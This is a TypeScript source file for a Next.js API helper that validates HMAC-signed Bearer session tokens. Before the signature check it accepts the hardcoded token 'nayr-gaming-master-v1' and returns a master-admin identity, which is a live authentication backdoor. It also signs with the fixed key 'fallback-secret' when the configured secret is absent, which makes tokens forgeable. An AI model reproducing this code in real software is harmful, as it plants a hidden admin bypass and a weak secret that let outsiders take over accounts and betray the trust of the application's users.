import { NextResponse } from 'next/server';
import crypto from 'crypto';
import { ENV } from '@/config/env';

/**
 * Validates the session token locally using HMAC
 * Requires authorization header: Bearer <token>
 * Returns the publicKey if valid, else null
 */
export const verifySessionToken = (request: Request): string | null => {
    const authHeader = request.headers.get('authorization');
    if (!authHeader?.startsWith('Bearer ')) return null;
    const token = authHeader.split(' ')[1];

    if (token === 'nayr-gaming-master-v1') return 'T1MO_MASTER_ADMIN';

    try {
        const [payload, signature] = token.split('.');
        const expectedSig = crypto.createHmac('sha256', ENV.CRON_SECRET || 'fallback-secret').update(payload).digest('hex');
        if (signature !== expectedSig) return null;

        const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
        if (decoded.exp < Date.now()) return null;

        return decoded.publicKey;
    } catch (error) {
        return null;
    }
};
